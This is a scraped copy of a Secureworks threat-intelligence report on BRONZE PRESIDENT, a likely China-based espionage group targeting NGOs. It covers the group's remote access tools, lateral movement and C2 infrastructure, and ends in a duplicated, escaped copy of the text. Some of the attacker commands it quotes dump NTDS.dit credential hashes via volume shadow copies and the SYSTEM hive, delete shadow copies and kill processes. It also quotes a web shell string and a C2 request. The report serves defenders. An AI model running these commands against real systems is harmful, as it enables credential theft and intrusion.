             "><div class="flex flex-row items-center gap-[5px] relative cursor-pointer" type="button" aria-expanded="false" role="button" tabindex="0"><span>Support resources</span></div><div class="absolute sub-menu-wrapper xl:left-auto xl:hidden left-[calc(100%+10px)]"><div class="sub-menu-heading"><div class="relative pb-[6px]"><div class="line-clamp-2 block">Support resources</div></div></div><ul class="sub-menu "><li data-key="menu-menu-6-menu-menu-6-1" class="li"><a tabindex="0" class="relative" target="_self" href="/en-us/support/downloads"><div class="flex flex-row items-center gap-[5px] relative "><span>Downloads and updates</span></div></a></li><li data-key="menu-menu-6-menu-menu-6-1" class="li"><a tabindex="0" class="relative" target="_blank" rel="noopener noreferrer" aria-label="(opens in new tab)" href="https://techvids.sophos.com/"><div class="flex flex-row items-center gap-[5px] relative "><span>Sophos Techvids</span></div></a></li><li data-key="menu-menu-6-menu-menu-6-1" class="li"><a tabindex="0" class="relative" target="_blank" rel="noopener noreferrer" aria-label="(opens in new tab)" href="https://status.sophos.com/"><div class="flex flex-row items-center gap-[5px] relative "><span>Sophos status page</span></div></a></li><li data-key="menu-menu-6-menu-menu-6-1" class="li"><a tabindex="0" class="relative" target="_self" href="/en-us/security-advisories"><div class="flex flex-row items-center gap-[5px] relative "><span>Security advisories</span></div></a></li><li data-key="menu-menu-6-menu-menu-6-1" class="li"><a tabindex="0" class="relative" target="_blank" rel="noopener noreferrer" aria-label="(opens in new tab)" href="https://support.sophos.com/support/s/filesubmission?language=en_US"><div class="flex flex-row items-center gap-[5px] relative "><span>Submit a threat</span></div></a></li></ul></div></li><li class="li   link

             "><div class="flex flex-row items-center gap-[5px] relative cursor-pointer" type="button" aria-expanded="false" role="button" tabindex="0"><span>Training</span></div><div class="absolute sub-menu-wrapper xl:left-auto xl:hidden left-[calc(100%+10px)]"><div class="sub-menu-heading"><div class="relative pb-[6px]"><div class="line-clamp-2 block">Training</div></div></div><ul class="sub-menu "><li data-key="menu-menu-6-menu-menu-6-3" class="li"><a tabindex="0" class="relative" target="_self" href="/en-us/training"><div class="flex flex-row items-center gap-[5px] relative "><span>Sophos Academy</span></div></a></li></ul></div></li><li class="li cta   no-link

Get immediate help. </a></div></li></ul></li><li class="li cta   no-link
             "><div class="btn btn--outline-white header-btn [&amp;&gt;a]:xl:!px-xs [&amp;&gt;a]:xl:!py-xxs"><a tabindex="0" class="btn__link focused" target="_self" href="/en-us/products/contact-request">Get started</a></div></li></ul></div></div></div></header><main id="main-content"><script type="application/ld+json" async="">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://www.sophos.com","url":"https://www.sophos.com","sameAs":"https://en.wikipedia.org/wiki/Sophos","name":"Sophos","description":"Achieve Superior Cybersecurity Outcomes Through a Fully-Managed MDR Service or Self-Managed Security Operations Platform."},{"@type":"Article","@id":"https://www.sophos.com/en-us/research/bronze-president-targets-ngos","name":"Bronze President Targets NGOs | Sophos","headline":"Bronze President Targets NGOs","description":"The activities of some non-governmental organizations (NGOs) challenge governments on politically sensitive issues such as social, humanitarian, and environmental policies. data-nimg="1" class="group-hover:filter group-hover:invert group-hover:brightness-0 group-hover:contrast-100" style="color:transparent" src="/assets/images/icon-linkdin.svg"/></button></div><div class="social-icon w-[30px] h-[30px]"><button type="button" title="Share on Facebook" aria-label="Share on Facebook" class="group cursor-pointer w-full h-full flex items-center justify-center border-1 border-solid border-navy md:bg-grey-1 md:border-none rounded-[15px] lg:hover:bg-blue-dark transition-colors duration-200 ease-in-out"><img alt="Facebook logo" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="group-hover:filter group-hover:invert group-hover:brightness-0 group-hover:contrast-100" style="color:transparent" src="/assets/images/icon-facebook.svg"/></button></div></div></div><div class="styles-module__IgAWAW__blogContent md:flex[0_0_calc(100%_-_80px)] md:max-w-[calc(100%_-_80px)] xl:flex[0_0_100%] xl:max-w-[100%] xl:ml-xs xxl:ml-3xl"><div><div class="rich-text-wrapper styles-module__IgAWAW__RichText"><h2>Summary</h2><p>The activities of some non-governmental organizations (NGOs) challenge governments on politically sensitive issues such as social, humanitarian, and environmental policies. As a result, these organizations are often exposed to increased government-directed threats aimed at monitoring their activities, discrediting their work, or stealing their intellectual property. BRONZE PRESIDENT is a likely People's Republic of China (PRC)-based targeted cyberespionage group that uses both proprietary and publicly available tools to target NGO networks. Secureworks® Counter Threat Unit™ (CTU) researchers have observed BRONZE PRESIDENT activity since mid-2018 but identified artifacts suggesting that the threat actors may have been conducting network intrusions as far back as 2014.</p><p>CTU™ researchers divided the <a tabindex="0" rel="noopener noreferrer" href="https://www.gartner.com/en/documents/2487216/" target="_blank">threat intelligence</a> about this threat group into two sections: <a tabindex="0" href="#strategic">strategic</a> and <a tabindex="0" href="#tactical">tactical</a>. Executives can use the strategic assessment of the ongoing threat to determine how to reduce risk to their organization's mission and critical assets. Computer network defenders can use the tactical information gathered from incident response investigations and research to reduce the time and effort associated with responding to the threat group's activities.</p><h2>Key points</h2><ul><li>The BRONZE PRESIDENT cyberespionage group targets NGOs, as well as political and law enforcement organizations in countries in South and East Asia.</li><li>The threat group appears to have developed its own remote access tools that it uses alongside publicly available remote access and post-compromise toolsets.</li><li>After compromising a network, the threat actors elevate their privileges and install malware on a large proportion of systems. The group runs custom batch scripts to collect specific file types and takes proactive steps to minimize detection of its activities.</li></ul><p><a tabindex="0" name="strategic"></a></p><h2>Strategic threat intelligence</h2><p>Analysis of a threat group's targeting, origin, and competencies can determine which organizations could be at risk. This information can help organizations make strategic defensive decisions in relation to the BRONZE PRESIDENT threat group.</p><h3>Intent</h3><p>CTU researchers have observed BRONZE PRESIDENT targeting multiple NGOs. The threat actors steal data from compromised systems over a long period of time, which likely indicates a long-term objective of monitoring the target's network. BRONZE PRESIDENT uses custom batch scripts to collect either specific file types (including files with .pptx, .xlsx, .pdf extensions) or all files within a specific location. CTU researchers also observed evidence that the threat actors collect credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts.</p><p>Additionally, CTU researchers have observed evidence of BRONZE PRESIDENT targeting political and law enforcement organizations in countries adjacent to the PRC, including Mongolia and India. Some of the group's phishing lures suggest an interest in national security, humanitarian, and law enforcement organizations in the East, South, and Southeast Asia (see Figure 1). These examples reveal BRONZE PRESIDENT's likely intent to conduct political espionage in other countries in addition to targeting NGOs.<br></p><img width="auto" height="auto" src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/bltee2632199d7b3d3c/69300d152c96e0a68234a31f/bronze-president-figure-01.png" alt="bronze-president-figure-01.png" style="width: auto;height: auto;max-width: auto;"><p><em>Figure 1. August 2019 phishing lure referencing Mongolian national security topics. (Source: Secureworks)</em></p><h3>Attribution</h3><p>It is highly likely that BRONZE PRESIDENT is based in the PRC due to the following observations:</p><ul><li>The NGOs targeted by BRONZE PRESIDENT conduct research on issues relevant to the PRC.</li><li>Strong evidence links BRONZE PRESIDENT's infrastructure to entities within the PRC.</li><li>There are connections between a subset of the group's operational infrastructure and PRC-based Internet service providers.</li><li>Tools such as PlugX have historically been leveraged by threat groups operating in the PRC.</li></ul><br><p>It is likely that BRONZE PRESIDENT is sponsored or at least tolerated by the PRC government. The threat group's systemic long-term targeting of NGO and political networks does not align with patriotic or criminal threat groups.</p><h3>Capability</h3><p>BRONZE PRESIDENT has deployed a variety of remote access tools. The use of tools not previously observed by CTU researchers suggests that the group could have access to malware development capabilities. BRONZE PRESIDENT also uses widely available or modified open-source tools, which could be a strategic effort to reduce the risk of attribution or to minimize the need for tool development resources. Following a network compromise, the threat actors typically delete their tools and processes. However, the group is content leaving some malware on the network, likely to provide a contingency if other access channels are removed. When the group's activities were detected in one incident, it had elevated privileges and had maintained access to the targeted environment for several months. This finding indicates the group's effectiveness at maintaining long-term access to a targeted network.<a tabindex="0" name="tactical"></a></p><h2>Tactical threat intelligence</h2><p>Incident response engagements have given CTU researchers insight into the threat group's tools and tactics.</p><h3>Tools</h3><p>CTU researchers and Secureworks incident responders have observed BRONZE PRESIDENT using the following tools, along with several custom batch scripts for locating and archiving specific file types:</p><ul><li>Cobalt Strike — This popular and commercially available penetration tool gains shell access to an infected system. It allows threat actors to execute additional tools and perform post-intrusion actions on compromised systems. Cobalt Strike appears to be one of BRONZE PRESIDENT's preferred remote access tools. During one intrusion, the threat actors installed it on over 70% of accessible hosts. The group's Cobalt Strike installation typically uses a payload named svchost.exe in an attempt to disguise Cobalt Strike activity as the legitimate Windows svchost.exe executable.</li><li>PlugX — This remote access trojan (RAT) is popular among PRC-based targeted threat groups. Its functionality includes uploading and downloading files, and it has configurable network protocols. BRONZE PRESIDENT installs PlugX using DLL side-loading. In June and August 2019, BRONZE PRESIDENT delivered PlugX via government and law enforcement-themed phishing <a tabindex="0" rel="noopener noreferrer" href="https://twitter.com/h4ckak/status/1163328926573137922?s=19" target="_blank">lures</a>.</li><li>ORat — CTU researchers have only observed this basic loader tool in the context of BRONZE PRESIDENT intrusions. ORat is the name assigned by the malware author, as denoted by the program debug database string in the analyzed sample: D:\vswork\Plugin\ORat\build\Release\ORatServer\Loader.pdb. The tool uses the Windows Management Instrumentation (WMI) event consumer for persistence by installing a script to the system's WMI registry. Messages sent from ORat to its command and control (C2) server start with the string "VIEWS0018x". If the data received from the C2 server starts with the same string, then the remainder of the payload is decompressed using ORat's "deflate" algorithm and called as a function. ORat acts as a flexible loader tool rather than a fully featured remote access tool.</li><li>RCSession — This basic RAT is installed via DLL side-loading, and CTU researchers observed BRONZE PRESIDENT installing it on multiple hosts during intrusions. RCSession was extracted from a file called English.rtf and launched via a <a tabindex="0" rel="noopener noreferrer" href="https://attack.mitre.org/techniques/T1093/" target="_blank">hollowed</a> svchost.exe process. RCSession connects to its C2 server via a custom protocol, can remotely execute commands, and can launch additional tools. CTU researchers have no evidence of other threat actors using RCSession or of wide proliferation of the tool, suggesting it may be exclusively used by BRONZE PRESIDENT.</li><li>Nbtscan — This publicly available command-line tool scans systems for NetBIOS name information (see Figure 2). In an example observed by CTU researchers, the Nbtscan executable was named Adobe.exe and was installed in several working directories on compromised hosts, including: C:\Recovery\.<br><img src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt3018ca9ca08db138/69300d42bddc887962200b28/bronze-president-figure-02.png" alt="bronze-president-figure-02.png" height="auto"><br><em>Figure 2. Nbtscan being used via RCSession to scan an internal IP range. (Source: Secureworks)</em></li><li>Nmap — BRONZE PRESIDENT used this freely available network scanning tool from the C:\PerfLogs\ folder.</li><li><a tabindex="0" rel="noopener noreferrer" href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs" target="_blank">Wmiexec</a> — This publicly available tool uses WMI to create SYSTEM-level shells on remote hosts.</li></ul><h4>Links to other malware</h4><p>While analyzing hosts compromised by BRONZE PRESIDENT, CTU researchers identified other malware artifacts. Although there was no evidence of the group using the malware, the threat actors may have leveraged its access or capabilities during earlier phases of the intrusions. The BRONZE PRESIDENT intrusions observed by CTU researchers appear to have taken place over several months or years.</p><p>China Chopper web shell files named error404.aspx included the "eval(Request.Item["|"],"unsafe");" string. To successfully interact with the web shell, a threat actor sent HTTP requests that included the "|" parameter. The web shell files appeared to be installed during the timeframe that BRONZE PRESIDENT was active on the system (see Figure 3).<br></p><p>&nbsp;</p><img src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/bltb648290115fd9b53/69300d6ebddc882f58200b2c/bronze-president-figure-03.png" alt="bronze-president-figure-03.png" height="auto"><p><em>Figure 3. Timeline of malicious tool use on a compromised host. (Source: Secureworks)</em></p><p>CTU researchers identified a variety of post-compromise tools stored under %AppData% (e.g., \AppData\Roaming\Temp) on several compromised systems. The widespread proliferation and use of the following tools suggest that the group likely has the knowledge and capability to use them as part of its operations:</p><ul><li><a tabindex="0" rel="noopener noreferrer" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1" target="_blank">Powerview.ps1</a> — This PowerShell-based module for network reconnaissance is part of the <a tabindex="0" rel="noopener noreferrer" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank">PowerSploit</a> penetration testing framework.</li><li><a tabindex="0" rel="noopener noreferrer" href="https://www.corelan.be/index.php/2009/07/12/free-tool-find-where-ad-users-are-logged-on-into/" target="_blank">PVE Find AD User</a> — This command-line tool identifies login locations of Active Directory (AD) users.</li><li><a tabindex="0" rel="noopener noreferrer" href="http://www.joeware.net/freetools/tools/adfind/" target="_blank">AdFind</a> — This command-line tool conducts AD queries.</li><li><a tabindex="0" rel="noopener noreferrer" href="http://www.joeware.net/freetools/tools/netsess/" target="_blank">NetSess</a> — This publicly available tool enumerates NetBIOS sessions.</li><li><a tabindex="0" rel="noopener noreferrer" href="https://github.com/mubix/netview" target="_blank">Netview</a> — This tool enumerates networks.</li><li><a tabindex="0" rel="noopener noreferrer" href="https://www.teamviewer.com/" target="_blank">TeamViewer</a> — This remote control and desktop-sharing tool has applications for legitimate and malicious system users. Its installation in a temporary directory alongside network reconnaissance and enumeration tools likely indicates malicious intent.</li></ul><h3>Initial access and working directories</h3><p>At the time of detection, observed BRONZE PRESIDENT incidents had likely been ongoing for several months or even years. As a result, CTU researchers were unable to ascertain the initial access vector. In October 2019, third-party researchers <a tabindex="0" rel="noopener noreferrer" href="https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations" target="_blank">described</a> a phishing campaign that used C2 infrastructure that CTU researchers attribute to BRONZE PRESIDENT. This connection suggests that the group uses phishing emails with ZIP attachments that contain LNK files as an initial access vector.</p><p>During one intrusion, the threat actors gained administrator access to all systems within a targeted business unit and installed their remote access tools on 80% of the hosts. The group installed multiple tools within the environment, including three different tools on a strategically important server, likely to provide contingency access options (see Table 1).</p><div class="table-responsive w-full overflow-x-auto"><table border="1" cellspacing="0" cellpadding="0"><tbody><tr><th>HOST</th><th>Cobalt Strike</th><th>RCSession</th><th>ORat</th></tr><tr><td valign="top">Host 1 (Server)</td><td valign="top">X</td><td valign="top">X</td><td valign="top">X</td></tr><tr><td valign="top">Host 2 (User PC)</td><td valign="top">X</td><td valign="top">&nbsp;</td><td valign="top">&nbsp;</td></tr><tr><td valign="top">Host 3 (User PC)</td><td valign="top">X</td><td valign="top">X</td><td valign="top">&nbsp;</td></tr><tr><td valign="top">Host 4 (User PC)</td><td valign="top">&nbsp;</td><td valign="top">X</td><td valign="top">&nbsp;</td></tr><tr><td valign="top">Host 5 (User PC)</td><td valign="top">&nbsp;</td><td valign="top">X</td><td valign="top">&nbsp;</td></tr><tr><td valign="top">Host 6 (User PC)</td><td valign="top">X</td><td valign="top">X</td><td valign="top">&nbsp;</td></tr><tr><td valign="top">Host 7 (User PC)</td><td valign="top">X</td><td valign="top">&nbsp;</td><td valign="top">&nbsp;</td></tr></tbody></table></div><p><em>Table 1. Remote access tools identified on infected hosts during a BRONZE PRESIDENT intrusion.</em></p><p>BRONZE PRESIDENT used multiple directories to install tools on compromised hosts (see Table 2).</p><div class="table-responsive w-full overflow-x-auto"><table border="1" cellspacing="0" cellpadding="0"><tbody><tr><th>Directory</th><th>Associated tool</th></tr><tr><td valign="top">C:\RECYCLER\&nbsp;</td><td valign="top">ORat</td></tr><tr><td valign="top">C:\Windows\Help\Help\&nbsp;</td><td valign="top">Cobalt Strike</td></tr><tr><td valign="top">C:\Windows\debug\WIA\&nbsp;</td><td valign="top">Cobalt Strike</td></tr><tr><td valign="top">C:\Windows\Logs\DPX\&nbsp;</td><td valign="top">Cobalt Strike</td></tr><tr><td valign="top">C:\PerfLogs\&nbsp;</td><td valign="top">RCSession</td></tr><tr><td valign="top">C:\Recovery\</td><td valign="top">Nbtscan</td></tr></tbody></table></div><p><em>Table 2. Directories used by BRONZE PRESIDENT to execute or store tools.</em></p><h3>Network enumeration, lateral movement, and credential access</h3><p>During multiple intrusions, the threat actors employed various tools and techniques to understand the network environments. For example, they used Nmap to scan various internal IP address ranges and SMB ports (see Figure 4). They also relied on Nbtscan, net user, and ping commands to obtain insights and identify opportunities for lateral movement.</p><img src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt0f55437e894f8d8f/69300d862c96e0a89034a323/bronze-president-figure-04.png" alt="bronze-president-figure-04.png" height="auto"><p><em>Figure 4. Nmap network scanning tool use via RCSession. (Source: Secureworks)</em></p><p>BRONZE PRESIDENT regularly leverages Wmiexec to move laterally. During one intrusion, the threat actors extensively used this tool to execute WMI commands on remote hosts in the environment (see Figure 5).</p><img src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt968fa006c33de00f/69300d98d6ccd23cb4637b2f/bronze-president-figure-05.png" alt="bronze-president-figure-05.png" height="auto"><p><em>Figure 5. Wmiexec used to execute commands on a targeted host. (Source: Secureworks)</em></p><p>They also frequently leverage net commands to connect to other hosts (see Figure 6) using compromised credentials collected during early phases of the intrusion.</p><img src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt7df2670a56e5061d/69300db6769c2ef5938398f0/bronze-president-figure-06.png" alt="bronze-president-figure-06.png" height="auto"><p><em>Figure 6. BRONZE PRESIDENT Nbtscan use and net commands. (Source: Secureworks)</em></p><p>During one intrusion observed by CTU researchers, the group used the native vssadmin tool on a domain controller to create a volume shadow copy:</p><pre>vssadmin create shadow /for=c:</pre><br><p>The threat actors retrieved the NTDS.dit file from the volume shadow copy. NTDS.dit contains Active Directory data, including password hashes for all users on a domain. Extracting hashes from the NTDS.dit file requires access to the SYSTEM file in the system registry:</p><pre>reg save hklm\system c:\windows\temp\system.hive</pre><br><p>The threat actors saved both the SYSTEM file (system.hive) and NTDS.dit in the compromised host's c:\windows\temp directory. These files were likely exfiltrated and exploited offline to retrieve user password hashes, which could then be cracked or used to perform pass-the-hash attacks.</p><h3>C2 communications and infrastructure</h3><p>BRONZE PRESIDENT's C2 techniques are dictated by its remote access tools. The group's primary and likely proprietary RCSession RAT communicates with a hard-coded C2 server using a custom protocol over TCP port 443. After connecting to its C2 server, RCSession checks in with an encrypted beacon and then awaits instruction. The ORat tool, which appears to be used less frequently by the group, communicates over TCP port 80 using a raw socket protocol (not HTTP).</p><p>The Cobalt Strike tool has malleable C2 profiles. During one intrusion, it connected to multiple C2 domains on TCP port 80, including mail . svrchost . com, using the following request. Subsequent Cobalt Strike C2 servers included subdomains of svchosts . com, svrchost . com, and strust . club.</p><pre>GET /Dv9i HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
Host: mail . svrchost . com
Connection: Keep-Alive
Cache-Control: no-cache</pre><br><p>Some BRONZE PRESIDENT C2 domains analyzed by CTU researchers were hosted on infrastructure owned by Dutch VPS provider Host Sailor, Hong Kong-based New World Telecoms, and Malaysia-based Shinjiru Technology (see Figure 7). The threat actors have used discrete infrastructure clusters that share matching hosting and registration characteristics. The pattern of infrastructure hosting suggests that the group parks its domains when not in use, an operational security technique that limits exposure of the group's overall hosting infrastructure.<br></p><img src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt524e9b8a61556c35/69300dd6e5684907a26d9d7e/bronze-president-figure-07.png" alt="bronze-president-figure-07.png" height="auto"><p><em>Figure 7. Hosting for a subset of BRONZE PRESIDENT C2 domains. (Source: Secureworks)</em></p><h3>Persistence, defensive evasion, and exfiltration</h3><p>Some of BRONZE PRESIDENT's malware has persistence capabilities. For example, ORat uses a WMI event consumer to maintain its presence on a compromised host. The group also creates and maintains scheduled tasks to achieve this purpose. Figure 8 shows a Sysdriver scheduled task that periodically executes a Cobalt Strike payload.</p><p><img src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt74f8edca5a5ab743/69300ded5dcec6c8be9defbe/bronze-president-figure-08.png" alt="bronze-president-figure-08.png" height="auto"><em>Figure 8. BRONZE PRESIDENT scheduled task created for Cobalt Strike persistence. (Source: Secureworks)</em></p><p>The threat actors tend to install malware on a large proportion of hosts during their intrusions. However, the group exercises restraint and defensive evasion tactics to minimize opportunities for network defenders to detect or investigate its activities. For example, the threat actors deleted volume shadow copies after using them for NTDS.dit retrieval:</p><pre>vssadmin delete shadows /for=c: /quiet</pre><br><p>Likewise, the group demonstrated diligence by killing local and remote processes after they had been used:</p><ul><li><pre>taskkill /im svchosts.exe /F</pre></li><li><pre>taskkill /S &lt;REMOTE SYSTEM NAME&gt; /U &lt;USERNAME&gt; /P &lt;PASSWORD&gt; /im svchost.exe</pre></li></ul><br><p>BRONZE PRESIDENT targets specific data types. The threat actors use custom batch scripts to create a list of files with predefined criteria and collate the identified files into a .rar archive (see Figure 9). CTU researchers have observed BRONZE PRESIDENT batch scripts named doc.bat, xls.bat, xlsx.bat, ppt.bat, pptx.bat, pdf.bat, and txt.bat.<br></p><img src="https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt09f27c66f5618007/69300dfd2e2f9d4040de201e/bronze-president-figure-09.png" alt="bronze-president-figure-09.png" height="auto"><p><em>Figure 9. Batch script (pptx.bat) used to collate and archive all .pptx files in a defined location. (Source: Secureworks)</em></p><p>The group also uses the all.bat batch script to collect all files stored on a specific user's desktop. CTU researchers observed RCSession and Cobalt Strike on systems that BRONZE PRESIDENT targeted for data theft. Either of these tools could have been used to exfiltrate the archived data.</p><h2>Conclusion</h2><p>BRONZE PRESIDENT has demonstrated intent to steal data from organizations using tools such as Cobalt Strike, PlugX, ORat, and RCSession. The concurrent use of so many tools during a single intrusion suggests that the group could include threat actors with distinct tactics, roles, and tool preferences. It is likely that BRONZE PRESIDENT has additional unobserved operational tools and capabilities. CTU researchers recommend that organizations apply controls to mitigate common intrusion techniques and behaviors along with controls that address the tools and techniques discussed in this analysis.</p><h2>Threat indicators</h2><p>The threat indicators in Table 3 are associated with BRONZE PRESIDENT threat campaigns. Note that IP addresses can be reallocated. The IP address and domains may contain malicious content, so consider the risks before opening them in a browser.</p><div class="table-responsive w-full overflow-x-auto"><table border="1" Analysis\"}]\na8:[\"$\",\"$L50\",\"blte154760b435865ea\",{\"ref\":\"$undefined\",\"href\":\"/en-us/research/type/research\",\"locale\":\"$undefined\",\"localeCookie\":\"$4f:props:localeCookie\",\"className\":\"tag-x-small activities of some non-governmental organizations (NGOs) challenge governments on politically sensitive issues such as social, humanitarian, and environmental policies. As a result, these organizations are often exposed to increased government-directed threats aimed at monitoring their activities, discrediting their work, or stealing their intellectual property. BRONZE PRESIDENT is a likely People's Republic of China (PRC)-based targeted cyberespionage group that uses both proprietary and publicly available tools to target NGO networks. Secureworks® Counter Threat Unit™ (CTU) researchers have observed BRONZE PRESIDENT activity since mid-2018 but identified artifacts suggesting that the threat actors may have been conducting network intrusions as far back as 2014.\u003c/p\u003e\u003cp\u003eCTU™ researchers divided the \u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://www.gartner.com/en/documents/2487216/\" target=\"_blank\"\u003ethreat intelligence\u003c/a\u003e about this threat group into two sections: \u003ca tabindex=\"0\" href=\"#strategic\"\u003estrategic\u003c/a\u003e and \u003ca tabindex=\"0\" href=\"#tactical\"\u003etactical\u003c/a\u003e. Executives can use the strategic assessment of the ongoing threat to determine how to reduce risk to their organization's mission and critical assets. Computer network defenders can use the tactical information gathered from incident response investigations and research to reduce the time and effort associated with responding to the threat group's activities.\u003c/p\u003e\u003ch2\u003eKey points\u003c/h2\u003e\u003cul\u003e\u003cli\u003eThe BRONZE PRESIDENT cyberespionage group targets NGOs, as well as political and law enforcement organizations in countries in South and East Asia.\u003c/li\u003e\u003cli\u003eThe threat group appears to have developed its own remote access tools that it uses alongside publicly available remote access and post-compromise toolsets.\u003c/li\u003e\u003cli\u003eAfter compromising a network, the threat actors elevate their privileges and install malware on a large proportion of systems. The group runs custom batch scripts to collect specific file types and takes proactive steps to minimize detection of its activities.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003ca tabindex=\"0\" name=\"strategic\"\u003e\u003c/a\u003e\u003c/p\u003e\u003ch2\u003eStrategic threat intelligence\u003c/h2\u003e\u003cp\u003eAnalysis of a threat group's targeting, origin, and competencies can determine which organizations could be at risk. This information can help organizations make strategic defensive decisions in relation to the BRONZE PRESIDENT threat group.\u003c/p\u003e\u003ch3\u003eIntent\u003c/h3\u003e\u003cp\u003eCTU researchers have observed BRONZE PRESIDENT targeting multiple NGOs. The threat actors steal data from compromised systems over a long period of time, which likely indicates a long-term objective of monitoring the target's network. BRONZE PRESIDENT uses custom batch scripts to collect either specific file types (including files with .pptx, .xlsx, .pdf extensions) or all files within a specific location. CTU researchers also observed evidence that the threat actors collect credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts.\u003c/p\u003e\u003cp\u003eAdditionally, CTU researchers have observed evidence of BRONZE PRESIDENT targeting political and law enforcement organizations in countries adjacent to the PRC, including Mongolia and India. Some of the group's phishing lures suggest an interest in national security, humanitarian, and law enforcement organizations in the East, South, and Southeast Asia (see Figure 1). These examples reveal BRONZE PRESIDENT's likely intent to conduct political espionage in other countries in addition to targeting NGOs.\u003cbr\u003e\u003c/p\u003e\u003cimg width=\"auto\" height=\"auto\" src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/bltee2632199d7b3d3c/69300d152c96e0a68234a31f/bronze-president-figure-01.png\" alt=\"bronze-president-figure-01.png\" style=\"width: auto;height: auto;max-width: auto;\"\u003e\u003cp\u003e\u003cem\u003eFigure 1. August 2019 phishing lure referencing Mongolian national security topics. (Source: Secureworks)\u003c/em\u003e\u003c/p\u003e\u003ch3\u003eAttribution\u003c/h3\u003e\u003cp\u003eIt is highly likely that BRONZE PRESIDENT is based in the PRC due to the following observations:\u003c/p\u003e\u003cul\u003e\u003cli\u003eThe NGOs targeted by BRONZE PRESIDENT conduct research on issues relevant to the PRC.\u003c/li\u003e\u003cli\u003eStrong evidence links BRONZE PRESIDENT's infrastructure to entities within the PRC.\u003c/li\u003e\u003cli\u003eThere are connections between a subset of the group's operational infrastructure and PRC-based Internet service providers.\u003c/li\u003e\u003cli\u003eTools such as PlugX have historically been leveraged by threat groups operating in the PRC.\u003c/li\u003e\u003c/ul\u003e\u003cbr\u003e\u003cp\u003eIt is likely that BRONZE PRESIDENT is sponsored or at least tolerated by the PRC government. The threat group's systemic long-term targeting of NGO and political networks does not align with patriotic or criminal threat groups.\u003c/p\u003e\u003ch3\u003eCapability\u003c/h3\u003e\u003cp\u003eBRONZE PRESIDENT has deployed a variety of remote access tools. The use of tools not previously observed by CTU researchers suggests that the group could have access to malware development capabilities. BRONZE PRESIDENT also uses widely available or modified open-source tools, which could be a strategic effort to reduce the risk of attribution or to minimize the need for tool development resources. Following a network compromise, the threat actors typically delete their tools and processes. However, the group is content leaving some malware on the network, likely to provide a contingency if other access channels are removed. When the group's activities were detected in one incident, it had elevated privileges and had maintained access to the targeted environment for several months. This finding indicates the group's effectiveness at maintaining long-term access to a targeted network.\u003ca tabindex=\"0\" name=\"tactical\"\u003e\u003c/a\u003e\u003c/p\u003e\u003ch2\u003eTactical threat intelligence\u003c/h2\u003e\u003cp\u003eIncident response engagements have given CTU researchers insight into the threat group's tools and tactics.\u003c/p\u003e\u003ch3\u003eTools\u003c/h3\u003e\u003cp\u003eCTU researchers and Secureworks incident responders have observed BRONZE PRESIDENT using the following tools, along with several custom batch scripts for locating and archiving specific file types:\u003c/p\u003e\u003cul\u003e\u003cli\u003eCobalt Strike — This popular and commercially available penetration tool gains shell access to an infected system. It allows threat actors to execute additional tools and perform post-intrusion actions on compromised systems. Cobalt Strike appears to be one of BRONZE PRESIDENT's preferred remote access tools. During one intrusion, the threat actors installed it on over 70% of accessible hosts. The group's Cobalt Strike installation typically uses a payload named svchost.exe in an attempt to disguise Cobalt Strike activity as the legitimate Windows svchost.exe executable.\u003c/li\u003e\u003cli\u003ePlugX — This remote access trojan (RAT) is popular among PRC-based targeted threat groups. Its functionality includes uploading and downloading files, and it has configurable network protocols. BRONZE PRESIDENT installs PlugX using DLL side-loading. In June and August 2019, BRONZE PRESIDENT delivered PlugX via government and law enforcement-themed phishing \u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://twitter.com/h4ckak/status/1163328926573137922?s=19\" target=\"_blank\"\u003elures\u003c/a\u003e.\u003c/li\u003e\u003cli\u003eORat — CTU researchers have only observed this basic loader tool in the context of BRONZE PRESIDENT intrusions. ORat is the name assigned by the malware author, as denoted by the program debug database string in the analyzed sample: D:\\vswork\\Plugin\\ORat\\build\\Release\\ORatServer\\Loader.pdb. The tool uses the Windows Management Instrumentation (WMI) event consumer for persistence by installing a script to the system's WMI registry. Messages sent from ORat to its command and control (C2) server start with the string \"VIEWS0018x\". If the data received from the C2 server starts with the same string, then the remainder of the payload is decompressed using ORat's \"deflate\" algorithm and called as a function. ORat acts as a flexible loader tool rather than a fully featured remote access tool.\u003c/li\u003e\u003cli\u003eRCSession — This basic RAT is installed via DLL side-loading, and CTU researchers observed BRONZE PRESIDENT installing it on multiple hosts during intrusions. RCSession was extracted from a file called English.rtf and launched via a \u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://attack.mitre.org/techniques/T1093/\" target=\"_blank\"\u003ehollowed\u003c/a\u003e svchost.exe process. RCSession connects to its C2 server via a custom protocol, can remotely execute commands, and can launch additional tools. CTU researchers have no evidence of other threat actors using RCSession or of wide proliferation of the tool, suggesting it may be exclusively used by BRONZE PRESIDENT.\u003c/li\u003e\u003cli\u003eNbtscan — This publicly available command-line tool scans systems for NetBIOS name information (see Figure 2). In an example observed by CTU researchers, the Nbtscan executable was named Adobe.exe and was installed in several working directories on compromised hosts, including: C:\\Recovery\\.\u003cbr\u003e\u003cimg src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt3018ca9ca08db138/69300d42bddc887962200b28/bronze-president-figure-02.png\" alt=\"bronze-president-figure-02.png\" 